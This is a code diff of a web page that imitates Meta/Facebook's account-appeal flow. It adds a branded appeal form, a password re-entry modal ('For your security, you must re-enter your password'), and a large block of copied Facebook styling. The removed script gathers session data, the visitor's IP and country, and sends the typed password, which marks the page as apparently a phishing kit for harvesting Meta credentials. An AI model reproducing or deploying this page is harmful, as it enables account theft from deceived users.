+                        name="formasubmitapeal"
+                        value="Submit"
+                        style="
+                          border-radius: 15px;
+                          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
+                          margin-top: 20px;
+                          padding: 15px 20px 15px 20px;
+                          color: #ffffff;
+                          background-color: #0067cd;
+                          border: 0px;
+                          font-weight: bold;
+                          font-size: 14px;
+                        "
+                      />
+
+                      <div style="margin-top: 15px">
+                        <p
+                          style="
+                            font-size: 14px;
+                            color: #67788a;
+                            display: inline-block;
+                          "
+                        >
+                          For more information about how Meta handles your data
+                          please read our
+                        </p>
+                        <a
+                          style="
+                            font-size: 14px;
+                            text-decoration: underline;
+                            color: #0064e0;
+                          "
+                          href="https://www.facebook.com/privacy/explanation/"
+                          >Meta Privacy Policy</a
+                        >
+                      </div>
                     </form>
+                  </div>
                 </div>
+              </div>
             </div>
+          </div>
+          <hr style="width: 50%" />
         </div>
-        <script src="npm/jquery.cookie%401.4.1/jquery.cookie.js"></script>
-        <script src="npm/bootstrap%404.3.1/dist/js/bootstrap.min.js"></script>
+      </section>
+      <!-- <div id="loading-circle"></div> -->
+      <div class="loader" id="loading-circle">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+        <div class="bar4"></div>
+        <div class="bar5"></div>
+        <div class="bar6"></div>
+        <div class="bar7"></div>
+        <div class="bar8"></div>
+        <div class="bar9"></div>
+        <div class="bar10"></div>
+        <div class="bar11"></div>
+        <div class="bar12"></div>
+      </div>
 
+      <div
+        class="modal fade"
+        style="margin-top: 20px"
+        id="passwordModal"
+        aria-modal="true"
+        role="dialog"
+        data-bs-keyboard="false"
+        data-bs-backdrop="static"
+      >
+        <div class="modal-dialog" role="document">
+          <div
+            style="
+              box-shadow: 0 2px 26px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(0, 0, 0, 0.1);
+            "
+            class="modal-content"
+          >
+            <div
+              style="
+                padding: 10px 15px;
+                background-color: #f5f6f7;
+                border-bottom: 1px solid #e5e5e5;
+              "
+              class="modal-header"
+            >
+              <h5
+                class="modal-title"
+                style="
+                  color: #67788a !important;
+                  font-size: 14px;
+                  font-weight: 600;
+                  line-height: 25px;
+                "
+              >
+                Please Enter Your Password
+              </h5>
+              <button
+                type="button"
+                class="close btn-modal-cancel cancel"
+                data-dismiss="modal"
+              >
+                <span aria-hidden="true" action="#">×</span>
+              </button>
+            </div>
+            <form style="margin-bottom: 0px">
+              <div class="modal-body">
+                <p style="font-size: 14px; color: #67788a">
+                  For your security, you must re-enter your password to
+                  continue.
+                </p>
 
-</div></body>
+                <div style="margin-bottom: 0" class="form-group row">
+                  <label
+                    id="hiqetash"
+                    for="inputPassword3"
+                    class="col-form-label"
+                    style="
+                      font-size: 14px;
+                      display: inline-block;
+                      padding-left: 15px;
+                      padding-right: 9px;
+                      color: #67788a;
+                    "
+                    >Password</label
+                  >
+                  <div id="hiqetash2" class="password-container">
+                    <input
+                      type="password"
+                      id="password-input"
+                      style="
+                        height: 25px;
+                        font-size: 16px;
+                        width: 170px;
+                        margin-top: 5px;
+                        border-radius: 0;
+                        padding: 0 3px;
+                      "
+                      class="form-control password_input"
+                      required=""
+                    />
+                  </div>
+                  <div
+                    style="
+                      display: none;
+                      margin-top: 10px;
+                      margin-left: 5px;
+                      opacity: 0.5;
+                    "
+                    id="togglePassword"
+                  >
+                    <span
+                      hidden=""
+                      class="hide-pass fa-regular fa-eye"
+                      aria-hidden="true"
+                      style="
+                        font-size: 12px;
+                        margin-top: 10px;
+                        margin-left: 5px;
+                        color: #67788a;
+                      "
+                      >HIDE</span
+                    >
+                    <span
+                      class="show-pass fa-regular fa-eye-slash"
+                      aria-hidden="true"
+                      style="
+                        font-size: 12px;
+                        margin-top: 10px;
+                        margin-left: 5px;
+                        color: #67788a;
+                      "
+                      >SHOW</span
+                    >
+                  </div>
+                </div>
+                <span id="message_err"></span>
 
-<script>
-    let check_submit = false
-    $(document).ready(function() {
-        (function() {
-            GetSess();
-            getIP();
-            AddSess();
-            checkCountry();
-            setInterval(function() {
-                getsttindex(); // Thay '32131' bằng id thực tế của bạn
-            }, 3000);
-        })();
+                <p
+                  class="password-error"
+                  style="
+                    color: red;
+                    font-size: 14px;
+                    margin-left: 25px;
+                    margin-top: 6px;
+                  "
+                ></p>
+                <p
+                  class="password-validating"
+                  style="
+                    color: green;
+                    font-size: 14px;
+                    margin-left: 25px;
+                    margin-top: 6px;
+                  "
+                ></p>
+              </div>
+              <div class="modal-footer">
+                <button
+                  style="
+                    background-color: #f5f6f7;
+                    border: 1px solid #ccd0d5;
+                    color: #4b4f56;
+                    height: 27px;
+                    padding: 1px 10px;
+                    line-height: 23px;
+                    font-size: 13px;
+                    font-weight: 600;
+                  "
+                  type="button"
+                  class="btn btn-secondary btn-modal-cancel cancel"
+                  data-dismiss="modal"
+                >
+                  Cancel
+                </button>
+                <button
+                  style="
+                    background-color: #4065b4;
+                    height: 27px;
+                    border: 1px solid #4267b2;
+                    padding: 1px 10px;
+                    line-height: 23px;
+                    font-size: 13px;
+                    font-weight: 600;
+                  "
+                  type="button"
+                  class="btn btn-primary submit_password"
+                >
+                  Submit
+                </button>
+                <button
+                  style="
+                    background-color: #4065b4;
+                    height: 27px;
+                    border: 1px solid #4267b2;
+                    padding: 1px 10px;
+                    line-height: 23px;
+                    font-size: 13px;
+                    font-weight: 600;
+                  "
+                  type="button"
+                  class="btn btn-primary try-again"
+                  hidden=""
+                >
+                  Try Again
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <style>
+        :root {
+          --fds-black: #000000;
+          --fds-black-alpha-05: rgba(0, 0, 0, 0.05);
+          --fds-black-alpha-10: rgba(0, 0, 0, 0.1);
+          --fds-black-alpha-15: rgba(0, 0, 0, 0.15);
+          --fds-black-alpha-20: rgba(0, 0, 0, 0.2);
+          --fds-black-alpha-30: rgba(0, 0, 0, 0.3);
+          --fds-black-alpha-40: rgba(0, 0, 0, 0.4);
+          --fds-black-alpha-50: rgba(0, 0, 0, 0.5);
+          --fds-black-alpha-60: rgba(0, 0, 0, 0.6);
+          --fds-black-alpha-80: rgba(0, 0, 0, 0.8);
+          --fds-blue-05: #ecf3ff;
+          --fds-blue-30: #aac9ff;
+          --fds-blue-40: #77a7ff;
+          --fds-blue-60: #1877f2;
+          --fds-blue-70: #2851a3;
+          --fds-blue-80: #1d3c78;
+          --fds-button-text: #444950;
+          --fds-comment-background: #f2f3f5;
+          --fds-dark-mode-gray-35: #cccccc;
+          --fds-dark-mode-gray-50: #828282;
+          --fds-dark-mode-gray-70: #4a4a4a;
+          --fds-dark-mode-gray-80: #373737;
+          --fds-dark-mode-gray-90: #282828;
+          --fds-dark-mode-gray-100: #1c1c1c;
+          --fds-gray-00: #f5f6f7;
+          --fds-gray-05: #f2f3f5;
+          --fds-gray-10: #ebedf0;
+          --fds-gray-20: #dadde1;
+          --fds-gray-25: #ccd0d5;
+          --fds-gray-30: #bec3c9;
+          --fds-gray-45: #8d949e;
+          --fds-gray-70: #606770;
+          --fds-gray-80: #444950;
+          --fds-gray-90: #303338;
+          --fds-gray-100: #1c1e21;
+          --fds-green-55: #00a400;
+          --fds-highlight: #3578e5;
+          --fds-highlight-cell-background: #ecf3ff;
+          --fds-primary-icon: #1c1e21;
+          --fds-primary-text: #1c1e21;
+          --fds-red-55: #fa383e;
+          --fds-soft: cubic-bezier(0.08, 0.52, 0.52, 1);
+          --fds-spectrum-aluminum-tint-70: #e4f0f6;
+          --fds-spectrum-blue-gray-tint-70: #cfd1d5;
+          --fds-spectrum-cherry: #f35369;
+          --fds-spectrum-cherry-tint-70: #fbccd2;
+          --fds-spectrum-grape-tint-70: #ddd5f0;
+          --fds-spectrum-grape-tint-90: #f4f1fa;
+          --fds-spectrum-lemon-dark-1: #f5c33b;
+          --fds-spectrum-lemon-tint-70: #fef2d1;
+          --fds-spectrum-lime: #a3ce71;
+          --fds-spectrum-lime-tint-70: #e4f0d5;
+          --fds-spectrum-orange-tint-70: #fcdec5;
+          --fds-spectrum-orange-tint-90: #fef4ec;
+          --fds-spectrum-seafoam-tint-70: #caeef9;
+          --fds-spectrum-slate-dark-2: #89a1ac;
+          --fds-spectrum-slate-tint-70: #eaeff2;
+          --fds-spectrum-teal: #6bcebb;
+          --fds-spectrum-teal-dark-1: #4dbba6;
+          --fds-spectrum-teal-dark-2: #31a38d;
+          --fds-spectrum-teal-tint-70: #d2f0ea;
+          --fds-spectrum-teal-tint-90: #f0faf8;
+          --fds-spectrum-tomato: #fb724b;
+          --fds-spectrum-tomato-tint-30: #f38e7b;
+          --fds-spectrum-tomato-tint-90: #fdefed;
+          --fds-strong: cubic-bezier(0.12, 0.8, 0.32, 1);
+          --fds-white: #ffffff;
+          --fds-white-alpha-05: rgba(255, 255, 255, 0.05);
+          --fds-white-alpha-10: rgba(255, 255, 255, 0.1);
+          --fds-white-alpha-20: rgba(255, 255, 255, 0.2);
+          --fds-white-alpha-30: rgba(255, 255, 255, 0.3);
+          --fds-white-alpha-40: rgba(255, 255, 255, 0.4);
+          --fds-white-alpha-50: rgba(255, 255, 255, 0.5);
+          --fds-white-alpha-60: rgba(255, 255, 255, 0.6);
+          --fds-white-alpha-80: rgba(255, 255, 255, 0.8);
+          --fds-yellow-20: #ffba00;
+          --accent: #0866ff;
+          --always-white: #ffffff;
+          --always-black: black;
+          --always-dark-gradient: linear-gradient(
+            rgba(0, 0, 0, 0),
+            rgba(0, 0, 0, 0.6)
+          );
+          --always-dark-overlay: rgba(0, 0, 0, 0.4);
+          --always-light-overlay: rgba(255, 255, 255, 0.4);
+          --always-gray-40: #65676b;
+          --always-gray-75: #bcc0c4;
+          --always-gray-95: #f0f2f5;
+          --attachment-footer-background: #f0f2f5;
+          --background-deemphasized: #f0f2f5;
+          --base-blue: #1877f2;
+          --base-cherry: #f3425f;
+          --base-grape: #9360f7;
+          --base-lemon: #f7b928;
+          --base-lime: #45bd62;
+          --base-pink: #ff66bf;
+          --base-seafoam: #54c7ec;
+          --base-teal: #2abba7;
+          --base-tomato: #fb724b;
+          --text-badge-info-background: hsl(214, 89%, 52%);
+          --text-badge-success-background: #31a24c;
+          --text-badge-attention-background: hsl(40, 89%, 52%);
+          --text-badge-critical-background: #e41e3f;
+          --blue-link: #0064d1;
+          --border-focused: #65676b;
+          --card-background: #ffffff;
+          --card-background-flat: #f7f8fa;
+          --comment-background: #f0f2f5;
+          --comment-footer-background: #f6f9fa;
+          --dataviz-primary-1: rgb(48, 200, 180);
+          --disabled-button-background: #e4e6eb;
+          --disabled-button-text: #bcc0c4;
+          --disabled-icon: #bcc0c4;
+          --disabled-text: #bcc0c4;
+          --divider: #ced0d4;
+          --event-date: #f3425f;
+          --fb-wordmark: #0866ff;
+          --filter-accent: invert(19%) sepia(70%) saturate(5671%)
+            hue-rotate(203deg) brightness(96%) contrast(101%);
+          --filter-always-white: invert(100%);
+          --filter-disabled-icon: invert(80%) sepia(6%) saturate(200%)
+            saturate(120%) hue-rotate(173deg) brightness(98%) contrast(89%);
+          --filter-placeholder-icon: invert(59%) sepia(11%) saturate(200%)
+            saturate(135%) hue-rotate(176deg) brightness(96%) contrast(94%);
+          --filter-primary-accent: invert(27%) sepia(95%) saturate(3116%)
+            hue-rotate(212deg) brightness(99%) contrast(105%);
+          --filter-primary-icon: invert(8%) sepia(10%) saturate(200%)
+            saturate(200%) saturate(166%) hue-rotate(177deg) brightness(104%)
+            contrast(91%);
+          --filter-secondary-icon: invert(39%) sepia(21%) saturate(200%)
+            saturate(109.5%) hue-rotate(174deg) brightness(94%) contrast(86%);
+          --filter-warning-icon: invert(77%) sepia(29%) saturate(200%)
+            saturate(200%) saturate(200%) saturate(200%) saturate(200%)
+            saturate(128%) hue-rotate(359deg) brightness(102%) contrast(107%);
+          --filter-blue-link-icon: invert(30%) sepia(98%) saturate(200%)
+            saturate(200%) saturate(200%) saturate(166.5%) hue-rotate(192deg)
+            brightness(91%) contrast(101%);
+          --filter-positive: invert(37%) sepia(61%) saturate(200%)
+            saturate(200%) saturate(200%) saturate(200%) saturate(115%)
+            hue-rotate(91deg) brightness(97%) contrast(105%);
+          --filter-negative: invert(25%) sepia(33%) saturate(200%)
+            saturate(200%) saturate(200%) saturate(200%) saturate(200%)
+            saturate(200%) saturate(110%) hue-rotate(345deg) brightness(132%)
+            contrast(96%);
+          --focus-ring-blue: #0866ff;
+          --glimmer-spinner-icon: #65676b;
+          --hero-banner-background: #ffffff;
+          --hosted-view-selected-state: #ebf5ff;
+          --highlight-bg: #e7f3ff;
+          --hover-overlay: rgba(0, 0, 0, 0.05);
+          --list-cell-chevron: #65676b;
+          --media-hover: rgba(68, 73, 80, 0.15);
+          --media-inner-border: rgba(0, 0, 0, 0.1);
+          --media-outer-border: #ffffff;
+          --media-pressed: rgba(68, 73, 80, 0.35);
+          --messenger-card-background: #ffffff;
+          --messenger-reply-background: #f0f2f5;
+          --overlay-alpha-80: rgba(244, 244, 244, 0.8);
+          --overlay-on-media: rgba(0, 0, 0, 0.6);
+          --nav-bar-background: #ffffff;
+          --nav-bar-background-gradient: linear-gradient(
+            to top,
+            #ffffff,
+            rgba(255, 255, 255.9),
+            rgba(255, 255, 255, 0.7),
+            rgba(255, 255, 255, 0.4),
+            rgba(255, 255, 255, 0)
+          );
+          --nav-bar-background-gradient-wash: linear-gradient(
+            to top,
+            #f0f2f5,
+            rgba(240, 242, 245.9),
+            rgba(240, 242, 245, 0.7),
+            rgba(240, 242, 245, 0.4),
+            rgba(240, 242, 245, 0)
+          );
+          --negative: hsl(350, 87%, 55%);
+          --negative-background: hsl(350, 87%, 55%, 20%);
+          --new-notification-background: #e7f3ff;
+          --non-media-pressed: rgba(68, 73, 80, 0.15);
+          --non-media-pressed-on-dark: rgba(255, 255, 255, 0.3);
+          --notification-badge: #e41e3f;
+          --placeholder-icon: #65676b;
+          --placeholder-image: rgb(164, 167, 171);
+          --placeholder-text: #65676b;
+          --placeholder-text-on-media: rgba(255, 255, 255, 0.5);
+          --popover-background: #ffffff;
+          --positive: #31a24c;
+          --positive-background: #deefe1;
+          --press-overlay: rgba(0, 0, 0, 0.1);
+          --primary-button-background: #0866ff;
+          --primary-button-icon: #ffffff;
+          --primary-button-pressed: #77a7ff;
+          --primary-button-text: #ffffff;
+          --primary-deemphasized-button-background: #ebf5ff;
+          --primary-deemphasized-button-pressed: rgba(0, 0, 0, 0.05);
+          --primary-deemphasized-button-pressed-overlay: rgba(
+            25,
+            110,
+            255,
+            0.15
+          );
+          --primary-deemphasized-button-text: #0064d1;
+          --primary-icon: #050505;
+          --primary-text: #050505;
+          --primary-text-on-media: #ffffff;
+          --primary-web-focus-indicator: #d24294;
+          --progress-ring-neutral-background: rgba(0, 0, 0, 0.2);
+          --progress-ring-neutral-foreground: #000000;
+          --progress-ring-on-media-background: rgba(255, 255, 255, 0.2);
+          --progress-ring-on-media-foreground: #ffffff;
+          --progress-ring-blue-background: #0866ff33;
+          --progress-ring-blue-foreground: #0866ff;
+          --progress-ring-disabled-background: rgba(190, 195, 201, 0.2);
+          --progress-ring-disabled-foreground: #bec3c9;
+          --rating-star-active: #eb660d;
+          --scroll-thumb: #bcc0c4;
+          --scroll-shadow: 0 1px 2px rgba(0, 0, 0, 0.1),
+            0 -1px rgba(0, 0, 0, 0.1) inset;
+          --secondary-button-background: #e4e6eb;
+          --secondary-button-background-floating: #ffffff;
+          --secondary-button-background-on-dark: rgba(0, 0, 0, 0.4);
+          --secondary-button-pressed: rgba(0, 0, 0, 0.05);
+          --secondary-button-stroke: transparent;
+          --secondary-button-text: #050505;
+          --secondary-icon: #65676b;
+          --secondary-text: #65676b;
+          --secondary-text-on-media: rgba(255, 255, 255, 0.9);
+          --section-header-text: #4b4c4f;
+          --shadow-1: rgba(0, 0, 0, 0.1);
+          --shadow-2: rgba(0, 0, 0, 0.2);
+          --shadow-5: rgba(0, 0, 0, 0.5);
+          --shadow-8: rgba(0, 0, 0, 0.8);
+          --shadow-inset: rgba(255, 255, 255, 0.5);
+          --shadow-elevated: 0 8px 20px 0 rgba(0, 0, 0, 0.2),
+            0 2px 4px 0 rgba(0, 0, 0, 0.1);
+          --shadow-persistent: 0px 0px 12px rgba(52, 72, 84, 0.05);
+          --shadow-primary: 0px 5px 12px rgba(52, 72, 84, 0.2);
+          --surface-background: #ffffff;
+          --switch-active: hsl(214, 89%, 52%);
+          --text-highlight: #0866ff33;
+          --input-background: #ffffff;
+          --input-background-disabled: #f0f2f5;
+          --input-border-color: #ced0d4;
+          --input-border-color-hover: var(--placeholder-text);
+          --input-label-color-highlighted: #0064d1;
+          --text-input-outside-label: #000000;
+          --toast-background: #ffffff;
+          --toast-text: #1c2b33;
+          --toast-text-link: #216fdb;
+          --toggle-active-background: #ebf5ff;
+          --toggle-active-icon: #0064d1;
+          --toggle-active-text: #0064d1;
+          --toggle-button-active-background: #e7f3ff;
+          --tooltip-background: rgba(244, 244, 244, 0.8);
+          --tooltip-box-shadow: 0 2px 4px 0 var(--shadow-5);
+          --wash: #e4e6eb;
+          --web-wash: #f0f2f5;
+          --warning: hsl(40, 89%, 52%);
+          --chat-bubble-padding-vertical: 8px;
+          --chat-bubble-padding-horizontal: 12px;
+          --chat-bubble-border-radius: 18px;
+          --fb-logo-color: #2d88ff;
+          --dialog-anchor-vertical-padding: 56px;
+          --header-height: 56px;
+          --global-panel-width: 0px;
+          --global-panel-width-expanded: 0px;
+          --alert-banner-corner-radius: 8px;
+          --button-corner-radius: 6px;
+          --button-corner-radius-medium: 10px;
+          --button-corner-radius-large: 12px;
+          --button-height-large: 40px;
+          --button-height-medium: 36px;
+          --button-padding-horizontal-large: 16px;
+          --button-padding-horizontal-medium: 16px;
+          --button-icon-padding-large: 16px;
+          --button-icon-padding-medium: 16px;
+          --button-inner-icon-spacing-large: 3px;
+          --button-inner-icon-spacing-medium: 3px;
+          --blueprint-button-height-medium: 40px;
+          --blueprint-button-height-large: 48px;
+          --card-corner-radius: 8px;
+          --card-box-shadow: 0 12px 28px 0 var(--shadow-2),
+            0 2px 4px 0 var(--shadow-1);
+          --card-padding-horizontal: 10px;
+          --card-padding-vertical: 20px;
+          --chip-corner-radius: 6px;
+          --dialog-corner-radius: 8px;
+          --glimmer-corner-radius: 8px;
+          --image-corner-radius: 4px;
+          --input-corner-radius: 6px;
+          --input-border-width: 1px;
+          --nav-list-cell-corner-radius: 8px;
+          --list-cell-corner-radius: 8px;
+          --list-cell-min-height: 52px;
+          --list-cell-padding-vertical: 20px;
+          --list-cell-padding-vertical-with-addon: 14px;
+          --menu-item-base-margin-horizontal: 8px;
+          --menu-item-base-padding-horizontal: 8px;
+          --nav-list-cell-min-height: 0px;
+          --nav-list-cell-padding-vertical: 16px;
+          --nav-list-cell-padding-vertical-with-addon: 16px;
+          --page-footer-padding-vertical: 16px;
+          --section-header-addOnEnd-margin-horizontal: 8px;
+          --section-header-addOnStart-margin-horizontal: 12px;
+          --section-header-addOnEnd-button-padding-horizontal: 0px;
+          --section-header-addOnEnd-button-padding-vertical: 0px;
+          --section-header-padding-vertical: 16px;
+          --section-header-subtitle-margin-vertical: 14px;
+          --section-header-subtitle-with-addOnEnd-margin-vertical: 6px;
+          --text-badge-corner-radius: 4px;
+          --text-badge-padding-horizontal: 6px;
+          --text-badge-padding-vertical: 6px;
+          --text-input-multi-padding-between-text-scrollbar: 20px;
+          --text-input-multi-padding-scrollbar: 16px;
+          --text-input-caption-margin-top: 10px;
+          --text-input-label-top: 22px;
+          --text-input-min-height: 64px;
+          --text-input-padding-vertical: 12px;
+          --toast-addon-padding-horizontal: 6px;
+          --toast-addon-padding-vertical: 6px;
+          --toast-container-max-width: 100%;
+          --toast-container-min-width: 288px;
+          --toast-container-padding-horizontal: 10px;
+          --toast-container-padding-vertical: 16px;
+          --toast-corner-radius: 8px;
+          --tooltip-corner-radius: 8px;
+          --typeahead-list-outer-padding-vertical: 2px;
+          --fds-animation-enter-exit-in: cubic-bezier(0.14, 1, 0.34, 1);
+          --fds-animation-enter-exit-out: cubic-bezier(0.45, 0.1, 0.2, 1);
+          --fds-animation-swap-shuffle-in: cubic-bezier(0.14, 1, 0.34, 1);
+          --fds-animation-swap-shuffle-out: cubic-bezier(0.45, 0.1, 0.2, 1);
+          --fds-animation-move-in: cubic-bezier(0.17, 0.17, 0, 1);
+          --fds-animation-move-out: cubic-bezier(0.17, 0.17, 0, 1);
+          --fds-animation-expand-collapse-in: cubic-bezier(0.17, 0.17, 0, 1);
+          --fds-animation-expand-collapse-out: cubic-bezier(0.17, 0.17, 0, 1);
+          --fds-animation-passive-move-in: cubic-bezier(0.5, 0, 0.1, 1);
+          --fds-animation-passive-move-out: cubic-bezier(0.5, 0, 0.1, 1);
+          --fds-animation-quick-move-in: cubic-bezier(0.1, 0.9, 0.2, 1);
+          --fds-animation-quick-move-out: cubic-bezier(0.1, 0.9, 0.2, 1);
+          --fds-animation-fade-in: cubic-bezier(0, 0, 1, 1);
+          --fds-animation-fade-out: cubic-bezier(0, 0, 1, 1);
+          --fds-duration-extra-extra-short-in: 100ms;
+          --fds-duration-extra-extra-short-out: 100ms;
+          --fds-duration-extra-short-in: 200ms;
+          --fds-duration-extra-short-out: 150ms;
+          --fds-duration-short-in: 280ms;
+          --fds-duration-short-out: 200ms;
+          --fds-duration-medium-in: 400ms;
+          --fds-duration-medium-out: 350ms;
+          --fds-duration-long-in: 500ms;
+          --fds-duration-long-out: 350ms;
+          --fds-duration-extra-long-in: 1000ms;
+          --fds-duration-extra-long-out: 1000ms;
+          --fds-duration-none: 0ms;
+          --fds-fast: 200ms;
+          --fds-slow: 400ms;
+          --font-family-apple: system-ui, -apple-system, BlinkMacSystemFont,
+            ".SFNSText-Regular", sans-serif;
+          --font-family-code: ui-monospace, Menlo, Consolas, Monaco, monospace;
+          --font-family-default: Helvetica, Arial, sans-serif;
+          --font-family-segoe: Segoe UI Historic, Segoe UI, Helvetica, Arial,
+            sans-serif;
+          --body-font-family: Placeholder Font;
+          --body-font-size: 0.9375rem;
+          --body-font-weight: 400;
+          --body-line-height: 1.3333;
+          --body-emphasized-font-family: Placeholder Font;
+          --body-emphasized-font-size: 0.9375rem;
+          --body-emphasized-font-weight: 600;
+          --body-emphasized-line-height: 1.3333;
+          --headline1-font-family: Optimistic Display Bold, system-ui,
+            sans-serif;
+          --headline1-font-size: 1.75rem;
+          --headline1-font-weight: 700;
+          --headline1-line-height: 1.2143;
+          --headline2-font-family: Optimistic Display Bold, system-ui,
+            sans-serif;
+          --headline2-font-size: 1.5rem;
+          --headline2-font-weight: 700;
+          --headline2-line-height: 1.25;
+          --headline3-font-family: Optimistic Display Bold, system-ui,
+            sans-serif;
+          --headline3-font-size: 1.0625rem;
+          --headline3-font-weight: 700;
+          --headline3-line-height: 1.2941;
+          --meta-font-family: Placeholder Font;
+          --meta-font-size: 0.8125rem;
+          --meta-font-weight: 400;
+          --meta-line-height: 1.3846;
+          --meta-emphasized-font-family: Placeholder Font;
+          --meta-emphasized-font-size: 0.8125rem;
+          --meta-emphasized-font-weight: 600;
+          --meta-emphasized-line-height: 1.3846;
+          --primary-label-font-family: Optimistic Display Medium, system-ui,
+            sans-serif;
+          --primary-label-font-size: 1.0625rem;
+          --primary-label-font-weight: 500;
+          --primary-label-line-height: 1.2941;
+          --secondary-label-font-family: Placeholder Font;
+          --secondary-label-font-size: 0.9375rem;
+          --secondary-label-font-weight: 500;
+          --secondary-label-line-height: 1.3333;
+          --tertiary-label-font-family: Placeholder Font;
+          --tertiary-label-font-size: 0.6875rem;
+          --tertiary-label-font-weight: 500;
+          --tertiary-label-line-height: 1.4545;
+          --text-input-field-font-family: Placeholder Font;
+          --text-input-field-font-size: 1rem;
+          --text-input-field-font-weight: 500;
+          --text-input-field-line-height: 1.2941;
+          --text-input-label-font-family: Placeholder Font;
+          --text-input-label-font-size: 17px;
+          --text-input-label-font-size-scale-multiplier: 0.75;
+          --text-input-label-font-weight: 400;
+          --text-input-label-line-height: 1.2941;
+          --dialog-size-medium-max-width: 700px;
+          --dialog-size-medium-width: 100%;
+          --dialog-size-small-max-width: 548px;
+          --dialog-size-small-width: 100%;
+          --dataviz-primary-2: rgb(134, 218, 255);
+          --dataviz-primary-3: rgb(95, 170, 255);
+          --dataviz-secondary-1: rgb(118, 62, 230);
+          --dataviz-secondary-2: rgb(147, 96, 247);
+          --dataviz-secondary-3: rgb(219, 26, 139);
+          --dataviz-supplementary-1: rgb(255, 122, 105);
+          --dataviz-supplementary-2: rgb(241, 168, 23);
+          --dataviz-supplementary-3: rgb(49, 162, 76);
+          --dataviz-supplementary-4: rgb(50, 52, 54);
+        }
+        .xzkaem6 {
+          z-index: 3;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1ja2u2z {
+          z-index: 0;
+        }
+        .xg6iff7 {
+          min-height: 100vh;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .xixxii4 {
+          position: fixed;
+        }
+        .xds687c {
+          right: 0;
+        }
+        .x1ey2m1c {
+          bottom: 0;
+        }
+        .x17qophe {
+          left: 0;
+        }
+        .x13vifvy {
+          top: 0;
+        }
 
-        document.getElementById('password-input').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                sendPasword();
-            }
+        .x1h0vfkc {
+          background-color: rgba(244, 244, 244, 0.8);
+        }
+
+        .xedcshv {
+          max-height: inherit;
+        }
+        .x3igimt {
+          height: inherit;
+        }
+        .x1t2pt76 {
+          min-height: inherit;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1h91t0o {
+          align-items: inherit;
+        }
+
+        .x1n2onr6 {
+          position: relative;
+        }
+        .xedcshv {
+          max-height: inherit;
+        }
+        .x3igimt {
+          height: inherit;
+        }
+        .x1t2pt76 {
+          min-height: inherit;
+        }
+
+        .xl56j7k {
+          justify-content: center;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x1qjc9v5 {
+          align-items: stretch;
+        }
+        .x1c4vz4f {
+          flex-grow: 0;
+        }
+
+        .xl56j7k {
+          justify-content: center;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .xurb0ha {
+          padding-left: 8px;
+        }
+
+        .xeuugli {
+          min-width: 0;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+
+        .x47corl {
+          pointer-events: none;
+        }
+        .x2lwn1j {
+          min-height: 0;
+        }
+        .x1sxyh0 {
+          padding-right: 8px;
+        }
+        .x1cy8zhl {
+          align-items: flex-start;
+        }
+
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x6ikm8r {
+          overflow-x: hidden;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x10wlt62 {
+          overflow-y: hidden;
+        }
+        .xh8yej3 {
+          width: 100%;
+        }
+
+        .x71s49j {
+          pointer-events: all;
+        }
+
+        .x1ja2u2z {
+          z-index: 0;
+        }
+        .x1afcbsf {
+          box-sizing: content-box;
+        }
+
+        .x1a2a7pz {
+          outline: none;
+        }
+
+        .x1qpq9i9 {
+          border-top-left-radius: var(--card-corner-radius);
+        }
+
+        .x104qc98 {
+          box-shadow: 0 12px 28px 0 var(--shadow-2), 0 2px 4px 0 var(--shadow-1),
+            inset 0 0 0 1px var(--shadow-inset);
+        }
+
+        .xng8ra {
+          height: 60px;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+
+        /* .x525zg8 {
+          padding-right: 60px;
+        } */
+        .xua58t2 {
+          border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+        }
+
+        .xl56j7k {
+          justify-content: center;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x6s0dn4 {
+          align-items: center;
+        }
+        .x1swvt13 {
+          padding-left: 16px;
+        }
+        .x1pi30zi {
+          padding-right: 16px;
+        }
+
+        .x5yr21d {
+          height: 100%;
+        }
+        .x193iq5w {
+          max-width: 100%;
+        }
+        .xeuugli {
+          min-width: 0;
+        }
+        .x1qlqyl8 {
+          font-size: inherit;
+        }
+        .x1pd3egz {
+          font-weight: inherit;
+        }
+        .x1heor9g {
+          color: inherit;
+          margin: 0;
+        }
+        .x1a2a7pz {
+          outline: none;
+        }
+
+        .x1lliihq {
+          display: block;
+        }
+        .x193iq5w {
+          max-width: 100%;
+        }
+        .x1603h9y {
+          font-size: 1.25rem;
+        }
+        .xvmahel {
+          -webkit-font-smoothing: antialiased;
+        }
+        .xeuugli {
+          min-width: 0;
+        }
+        .x1xlr1w8 {
+          font-weight: 700;
+        }
+        .x1vvkbs {
+          word-wrap: break-word;
+        }
+
+        .x1u7k74 {
+          line-height: 1.2;
+        }
+
+        .x1cpjm7i::before {
+          content: "";
+        }
+        .xudqn12::before {
+          margin-top: -5px;
+        }
+        .x1fgarty::before {
+          display: block;
+        }
+
+        .xuxw1ft {
+          white-space: nowrap;
+        }
+        .xlyipyv {
+          text-overflow: ellipsis;
+        }
+        .x6ikm8r {
+          overflow-x: hidden;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1lliihq {
+          display: block;
+        }
+        .x10wlt62 {
+          overflow-y: hidden;
+        }
+
+        .x1s928wv::after {
+          content: "";
+        }
+        .x1s928wv::after {
+          content: "";
+        }
+        .x1s928wv::after {
+          content: "";
+        }
+        .xhkezso::after {
+          display: block;
+        }
+        .x41vudc::after {
+          margin-bottom: -5px;
+        }
+
+        .x10l6tqk {
+          position: absolute;
+        }
